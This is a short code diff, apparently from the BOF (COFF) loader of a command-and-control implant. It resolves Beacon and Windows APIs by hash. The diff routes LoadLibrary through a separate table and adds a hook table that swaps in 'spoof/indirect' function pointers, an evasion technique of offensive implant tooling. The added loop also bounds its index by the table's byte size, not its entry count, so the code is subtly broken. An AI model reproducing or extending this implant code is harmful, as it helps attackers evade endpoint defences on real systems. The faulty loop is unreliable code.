@@ -134,7 +134,7 @@ auto Coff::RslRel(
         case IMAGE_REL_AMD64_REL32_5:
             DEF32( Rel ) = (UINT32)((ULONG_PTR)FlRel - (ULONG_PTR)Rel - sizeof(UINT32) - 5); break;
         case IMAGE_REL_AMD64_ADDR64:
-            C_DEF64( Rel ) = (UINT64)(ULONG_PTR)FlRel; break;
+            DEF64( Rel ) = (UINT64)(ULONG_PTR)FlRel; break;
     }
 }
 
@@ -167,15 +167,26 @@ auto Coff::RslApi(
     //
     if ( Hsh::Str( SymName ) == Hsh::Str( "GetProcAddress"   ) ) return (PVOID)Self->Krnl32.GetProcAddress;
     if ( Hsh::Str( SymName ) == Hsh::Str( "FreeLibrary"      ) ) return (PVOID)Self->Krnl32.FreeLibrary;
-    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryW"     ) ) return (PVOID)Self->Krnl32.LoadLibraryW;
-    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryA"     ) ) return (PVOID)Self->Krnl32.LoadLibraryA;
+    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryW"     ) ) return (PVOID)Self->Cf->LoadLibraryW;
+    if ( Hsh::Str( SymName ) == Hsh::Str( "LoadLibraryA"     ) ) return (PVOID)Self->Cf->LoadLibraryA;
     if ( Hsh::Str( SymName ) == Hsh::Str( "GetModuleHandleA" ) ) return (PVOID)Self->Krnl32.GetModuleHandleA;
     if ( Hsh::Str( SymName ) == Hsh::Str( "GetModuleHandleW" ) ) return (PVOID)Self->Krnl32.GetModuleHandleW;
 
     //
+    // if hook bof enabled apply the spoof/indirect
+    //
+    if ( this->HookEnabled ) {
+        for ( INT i = 0; i < sizeof( this->HookTable ); i++ ) {
+            if ( Hsh::Str( SymName ) == this->HookTable[i].Hash ) {
+                return (PVOID)this->HookTable[i].Ptr;
+            }
+        }
+    }
+
+    //
     // if not beacon api, resolve the windows api
     //
-    if ( !ApiAddress ) {
+    if ( ! ApiAddress ) {
         CHAR RawBuff[MAX_PATH];
 
         PCHAR LibName = nullptr;
